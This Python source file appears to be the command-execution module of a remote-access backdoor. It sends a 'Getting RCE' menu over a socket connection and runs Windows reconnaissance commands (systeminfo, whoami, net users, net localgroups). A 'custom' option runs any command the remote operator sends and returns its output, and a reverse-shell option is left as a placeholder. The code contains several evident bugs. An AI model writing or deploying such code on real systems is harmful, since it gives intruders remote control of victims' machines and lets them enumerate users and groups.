import os
import re
import subprocess
from modules.sockets.socket import Network

class CodeExecution:

    def __init__(self, nt):
        self = self
        self.nt = nt

    def dir(self):
        cmd = "dir"
        stream = os.popen(cmd)
        output = stream.readlines()
        data = ''
        data = ''
        for item in output:
            data += str(item)
        print(data)
        return data
    
    def systeminfo(self):
        cmd = "systeminfo"
        stream = os.popen(cmd)
        output = stream.readlines()
        data = ''
        for item in output:
            data += str(item)
        print(data)
        return data

    def whoami(self):
        cmd = "whoami"
        stream = os.popen(cmd)
        output = stream.readlines()
        data = ''
        for item in output:
            data += str(item)
        print(data)
        return data

    def net_users(self):
        cmd = "net users"
        stream = os.popen(cmd)
        output = stream.readlines()
        data = ''
        for item in output:
            data += str(item)
        print(data)
        return data

    def net_localgroups(self):
        cmd = "net localgroups"
        stream = os.popen(cmd)
        output = stream.readlines()
        data = ''
        for item in output:
            data += str(item)
        print(data)
        return data
    
    def custom(self):
        self.nt.connectionSend("Insert your command: ".encode("utf-8"))
        cmd = str(self.nt.connectionRecv())
        stream = os.popen(cmd)
        output = stream.readlines()
        data = ''
        for item in output:
            data += str(item)
        
        if not data:
            return "\r\nSyntax error\r\n"
        return data

    def get_shell(self):
        return "Shell goes here....."

    def code_execution(self):
        options_list = ["2. dir", "3. systeminfo", "4. whoami", "5. net users", "6. net localgroup", "7. custom", "8. get a shell"]
        data = ""
        for item in options_list:
            print(item)
            data += item+"\r\n"
        self.nt.connectionSend("Getting RCE...".encode("utf-8"))
        self.nt.connectionSend(data.encode("utf-8"))
        option = int(self.nt.connectionRecv())

        if(option == 1):
            self.nt.connectionClose()

        switcher = {
            2: self.dir,
            3: self.systeminfo,
            4: self.whoami,
            5: self.net_users,
            6: self.net_localgroups,
            7: self.custom
        }
        callback = switcher.get(option, "Invalid option")
        return callback()